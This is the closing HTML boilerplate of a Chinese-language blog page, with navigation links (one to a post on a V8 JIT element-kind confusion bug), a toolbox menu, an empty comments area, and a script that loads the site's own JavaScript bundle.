    </a>
    <a class="show pull-right" href="/2019/08/05/v8-JIT-Element Kind Confusion/">
        <i class="icon icon-angle-right"></i>
    </a>
  </div>




</div>


  <a id="backTop" class="back-top">
    <i class="icon-angle-up"></i>
  </a>




  <div class="modal" id="modal">
  <span id="cover" class="cover hide"></span>
  <div id="modal-dialog" class="modal-dialog hide-dialog">
    <div class="modal-header">
      <span id="close" class="btn-close">关闭</span>
    </div>
    <hr>
    <div class="modal-body">
      <ul class="list-toolbox">
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/archives/"
              rel="noopener noreferrer"
              target="_self"
              >
              博客
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/tag/"
              rel="noopener noreferrer"
              target="_self"
              >
              标签
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/about/"
              rel="noopener noreferrer"
              target="_self"
              >
              关于
            </a>
          </li>
        
      </ul>

    </div>
  </div>
</div>



  
      <div class="fexo-comments comments-post">
    

    

    
    

    

    
    

  </div>

  

  <script type="text/javascript">
  function loadScript(url, callback) {
    var script = document.createElement('script')
    script.type = 'text/javascript';

    if (script.readyState) { //IE
      script.onreadystatechange = function() {
        if (script.readyState == 'loaded' ||
          script.readyState == 'complete') {
          script.onreadystatechange = null;
          callback();
        }
      };
    } else { //Others
      script.onload = function() {
        callback();
      };
    }

    script.src = url;
    document.getElementsByTagName('head')[0].appendChild(script);
  }

  window.onload = function() {
    loadScript('/js/bundle.js?235683', function() {
      // load success
    });
  }
</script>

</body>
</html>
